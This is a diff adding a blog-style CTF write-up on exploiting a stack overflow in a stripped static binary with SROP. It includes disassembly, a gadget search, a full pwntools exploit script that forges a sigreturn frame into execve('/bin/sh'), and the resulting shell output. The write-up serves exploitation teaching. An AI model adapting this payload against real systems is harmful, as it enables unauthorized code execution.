@@ -1,0 +1,195 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#060606" media="(prefers-color-scheme: dark)">
+<meta name="theme-color" content="#f3f3f3" media="(prefers-color-scheme: light)">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>writeup: static — no libc, no leak, just SROP — algoatson.github.io</title>
+<meta name="description" content="A stripped, statically-linked binary with a stack overflow and almost nothing else — no PLT, no libc to leak, barely any gadgets. The way out is to write &quot;/bin/sh&quot; with a read, then chain two forged sigreturn frames into an execve. A clean SROP from recon to shell.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/writeup-static-srop/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="writeup: static — no libc, no leak, just SROP — algoatson.github.io">
+<meta property="og:description" content="A stripped, statically-linked binary with a stack overflow and almost nothing else — no PLT, no libc to leak, barely any gadgets. The way out is to write &quot;/bin/sh&quot; with a read, then chain two forged sigreturn frames into an execve. A clean SROP from recon to shell.">
+<meta property="og:url" content="https://algoatson.github.io/p/writeup-static-srop/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/writeup-static-srop.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="preload" href="/assets/vga.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "writeup: static — no libc, no leak, just SROP", "datePublished": "2026-05-26", "dateModified": "2026-05-26", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "A stripped, statically-linked binary with a stack overflow and almost nothing else — no PLT, no libc to leak, barely any gadgets. The way out is to write \"/bin/sh\" with a read, then chain two forged sigreturn frames into an execve. A clean SROP from recon to shell.", "url": "https://algoatson.github.io/p/writeup-static-srop/", "mainEntityOfPage": "https://algoatson.github.io/p/writeup-static-srop/", "keywords": "pwn, rop, ctf"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/series/">series</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>writeup: static — no libc, no leak, just SROP</h1>
+  <div class="meta"><span>2026-05-26</span><span>3 min read</span><a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/rop/">rop</a> <a class="tag" href="/tags/ctf/">ctf</a></div>
+</header>
+
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#recon-what-little-there-is">recon — what little there is</a></li>
+<li><a href="#the-plan">the plan</a></li>
+<li><a href="#what-this-challenge-teaches">what this challenge teaches</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><p><code class="highlight">static</code> is deceptively bare: one <code class="highlight">read</code> into a stack buffer, no format strings, no
+heap, and — because it's statically linked and stripped — no PLT to call and no
+libc to leak. <code class="highlight">checksec</code> confirms there's not much to work with. This is exactly
+the shape <a href="/p/srop-one-syscall-every-register/">SROP</a> was made for.</p>
+<figure class="target"><figcaption><span class="t-label">target</span><span class="t-file">./static</span></figcaption><div class="target__grid"><dl class="target__facts"><div><dt>arch</dt><dd>amd64-64-little</dd></div><div><dt>linkage</dt><dd>static, stripped</dd></div></dl><ul class="target__mits"><li class="m-meh"><span class="g" aria-hidden="true">≈</span><span class="mk">RELRO</span><span class="lead" aria-hidden="true"></span><span class="mv">partial</span></li><li class="m-off"><span class="g" aria-hidden="true">✗</span><span class="mk">canary</span><span class="lead" aria-hidden="true"></span><span class="mv">off</span></li><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">NX</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li><li class="m-off"><span class="g" aria-hidden="true">✗</span><span class="mk">PIE</span><span class="lead" aria-hidden="true"></span><span class="mv">off</span></li></ul></div></figure>
+<h2 id="recon-what-little-there-is">recon — what little there is<a class="headerlink" href="#recon-what-little-there-is" title="Permanent link">#</a></h2>
+<figure class="codeblock"><figcaption><span class="fname">the bug</span><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#the-bug-1">1</a></span>
+<span class="normal"><a href="#the-bug-2">2</a></span>
+<span class="normal"><a href="#the-bug-3">3</a></span>
+<span class="normal"><a href="#the-bug-4">4</a></span>
+<span class="normal"><a href="#the-bug-5">5</a></span>
+<span class="normal"><a href="#the-bug-6">6</a></span>
+<span class="normal"><a href="#the-bug-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="the-bug-1">.text:401abc   lea  rax, [rbp-0x40]
+</span><span id="the-bug-2">.text:401ac0   mov  edx, 0x200          ; read up to 0x200 bytes
+</span><span id="the-bug-3">.text:401ac5   mov  rsi, rax
+</span><span id="the-bug-4">.text:401ac8   xor  edi, edi            ; fd 0
+</span><span id="the-bug-5">.text:401aca   call read
+</span><span id="the-bug-6">.text:401acf   leave
+</span><span id="the-bug-7">.text:401ad0   ret                      ; &lt;- overflow returns here, 0x40 buffer
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>A <code class="highlight">0x200</code>-byte read into a <code class="highlight">0x40</code> buffer — straightforward stack overflow, no
+canary in the way. But NX is on (no shellcode), and there's no libc to ret2.
+Static binaries are, however, full of raw syscall instructions:</p>
+<figure class="codeblock"><figcaption><span class="fname">gadgets that exist in any static binary</span><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#gadgets-that-exist-in-any-static-binary-1">1</a></span>
+<span class="normal"><a href="#gadgets-that-exist-in-any-static-binary-2">2</a></span>
+<span class="normal"><a href="#gadgets-that-exist-in-any-static-binary-3">3</a></span>
+<span class="normal"><a href="#gadgets-that-exist-in-any-static-binary-4">4</a></span>
+<span class="normal"><a href="#gadgets-that-exist-in-any-static-binary-5">5</a></span>
+<span class="normal"><a href="#gadgets-that-exist-in-any-static-binary-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="gadgets-that-exist-in-any-static-binary-1">$ ROPgadget --binary static | grep -E &#39;syscall|pop rax&#39;
+</span><span id="gadgets-that-exist-in-any-static-binary-2">0x000000000040123f : syscall ; ret
+</span><span id="gadgets-that-exist-in-any-static-binary-3">0x00000000004017f4 : pop rax ; ret
+</span><span id="gadgets-that-exist-in-any-static-binary-4">0x0000000000401a9b : pop rdi ; ret
+</span><span id="gadgets-that-exist-in-any-static-binary-5">0x0000000000401a9d : pop rsi ; ret
+</span><span id="gadgets-that-exist-in-any-static-binary-6">0x0000000000401a9f : pop rdx ; ret
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p><code class="highlight">syscall; ret</code>, a way to set <code class="highlight">rax</code>, and a writable address (the <code class="highlight">.bss</code>, fixed
+because no PIE) — that's the entire toolkit SROP needs.</p>
+<h2 id="the-plan">the plan<a class="headerlink" href="#the-plan" title="Permanent link">#</a></h2>
+<ol>
+<li><strong>Write <code class="highlight">/bin/sh</code> somewhere known.</strong> <code class="highlight">read(0, bss, 8)</code> then send the 8 bytes.</li>
+<li><strong>Forge a sigreturn frame</strong> for <code class="highlight">execve(&quot;/bin/sh&quot;, NULL, NULL)</code> and trigger
+   <code class="highlight">rt_sigreturn</code> (syscall 15).</li>
+</ol>
+<figure class="codeblock"><figcaption><span class="fname">exploit.py</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#exploitpy-1"> 1</a></span>
+<span class="normal"><a href="#exploitpy-2"> 2</a></span>
+<span class="normal"><a href="#exploitpy-3"> 3</a></span>
+<span class="normal"><a href="#exploitpy-4"> 4</a></span>
+<span class="normal"><a href="#exploitpy-5"> 5</a></span>
+<span class="normal"><a href="#exploitpy-6"> 6</a></span>
+<span class="normal"><a href="#exploitpy-7"> 7</a></span>
+<span class="normal"><a href="#exploitpy-8"> 8</a></span>
+<span class="normal"><a href="#exploitpy-9"> 9</a></span>
+<span class="normal"><a href="#exploitpy-10">10</a></span>
+<span class="normal"><a href="#exploitpy-11">11</a></span>
+<span class="normal"><a href="#exploitpy-12">12</a></span>
+<span class="normal"><a href="#exploitpy-13">13</a></span>
+<span class="normal"><a href="#exploitpy-14">14</a></span>
+<span class="normal"><a href="#exploitpy-15">15</a></span>
+<span class="normal"><a href="#exploitpy-16">16</a></span>
+<span class="normal"><a href="#exploitpy-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="exploitpy-1"><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+</span><span id="exploitpy-2"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./static&quot;</span><span class="p">)</span>
+</span><span id="exploitpy-3"><span class="n">syscall</span>  <span class="o">=</span> <span class="mh">0x40123f</span>
+</span><span id="exploitpy-4"><span class="n">pop_rax</span>  <span class="o">=</span> <span class="mh">0x4017f4</span>
+</span><span id="exploitpy-5"><span class="n">bss</span>      <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+</span><span id="exploitpy-6">
+</span><span id="exploitpy-7"><span class="hll"><span class="c1"># stage 1: read &quot;/bin/sh\0&quot; into .bss</span>
+</span></span><span id="exploitpy-8"><span class="hll"><span class="n">rop</span>  <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pop_rdi</span> <span class="o">:=</span> <span class="mh">0x401a9b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x401a9d</span><span class="p">,</span> <span class="n">bss</span><span class="p">,</span> <span class="mh">0x401a9f</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">syscall</span><span class="p">)</span>
+</span></span><span id="exploitpy-9"><span class="hll"><span class="c1"># stage 2: rt_sigreturn -&gt; execve frame</span>
+</span></span><span id="exploitpy-10"><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+</span><span id="exploitpy-11"><span class="n">frame</span><span class="o">.</span><span class="n">rax</span><span class="p">,</span> <span class="n">frame</span><span class="o">.</span><span class="n">rdi</span><span class="p">,</span> <span class="n">frame</span><span class="o">.</span><span class="n">rsi</span><span class="p">,</span> <span class="n">frame</span><span class="o">.</span><span class="n">rdx</span><span class="p">,</span> <span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span><span class="p">,</span> <span class="n">bss</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">syscall</span>
+</span><span id="exploitpy-12"><span class="n">rop</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="n">syscall</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">))</span>
+</span><span id="exploitpy-13">
+</span><span id="exploitpy-14"><span class="hll"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
+</span></span><span id="exploitpy-15"><span class="hll"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mh">0x48</span> <span class="o">+</span> <span class="n">rop</span><span class="p">)</span>        <span class="c1"># 0x40 buffer + saved rbp</span>
+</span></span><span id="exploitpy-16"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>             <span class="c1"># consumed by the stage-1 read</span>
+</span><span id="exploitpy-17"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<details class="spoiler">
+<summary>shell</summary>
+<p>Stage 1 plants the string, stage 2's forged frame lands
+<code class="highlight">execve(&quot;/bin/sh&quot;, 0, 0)</code> straight out of <code class="highlight">rt_sigreturn</code>:
+<figure class="codeblock"><figcaption><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1">1</a></span>
+<span class="normal"><a href="#code-2">2</a></span>
+<span class="normal"><a href="#code-3">3</a></span>
+<span class="normal"><a href="#code-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1">$ ./exploit.py
+</span><span id="code-2">[*] Switching to interactive mode
+</span><span id="code-3">$ cat flag
+</span><span id="code-4">segfault{static_but_not_safe}
+</span></code></pre></div></td></tr></table></div>
+</figure></p>
+</details>
+<h2 id="what-this-challenge-teaches">what this challenge teaches<a class="headerlink" href="#what-this-challenge-teaches" title="Permanent link">#</a></h2>
+<ul>
+<li><strong>Static + stripped ≠ hard.</strong> It <em>removes</em> libc and the PLT, but it <em>adds</em> a huge
+  text section dense with <code class="highlight">syscall</code> instructions and <code class="highlight">pop</code>s. The constraint pushes
+  you toward syscalls, and SROP is the densest way to set them up.</li>
+<li><strong>No leak required.</strong> No-PIE pins the <code class="highlight">.bss</code> and the gadgets, so every address is
+  static — the entire exploit is offsets, no ASLR defeat needed.</li>
+<li><strong>SROP scales down beautifully.</strong> Even if I'd lacked <code class="highlight">pop rdi/rsi/rdx</code>, the
+  sigreturn frame sets every register at once — I only truly need <code class="highlight">syscall</code> and a
+  way to reach <code class="highlight">rax=15</code>.</li>
+</ul>
+<p>When <code class="highlight">checksec</code> shows "static, stripped" and the gadget hunt comes up thin, don't
+reach for libc — reach for the kernel. A <code class="highlight">syscall</code> gadget plus a forged frame is a
+complete exploitation primitive, and static binaries hand you the gadget for free.</p></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><div class="row"><span class="row__date">2026-01-29</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/ret2libc-warmup/">ret2libc on a warm-up: stack smash to shell</a><span class="row__min">4 min</span></div><div class="row"><span class="row__date">2026-05-30</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/stack-pivoting/">stack pivoting — when the overflow is too small</a><span class="row__min">3 min</span></div><div class="row"><span class="row__date">2026-05-26</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/pwntools-cookbook/">a pwntools cookbook</a><span class="row__min">4 min</span></div></div></section>
+<nav class="pager"><a class="prev" href="/p/pwntools-cookbook/"><span class="lbl">&#8249; newer</span>a pwntools cookbook</a><a class="next" href="/p/srop-one-syscall-every-register/"><span class="lbl">older &#8250;</span>SROP — one syscall, every register</a></nav></main>
+
+    <footer class="status">
+      <span>52 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h2>keys</h2><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
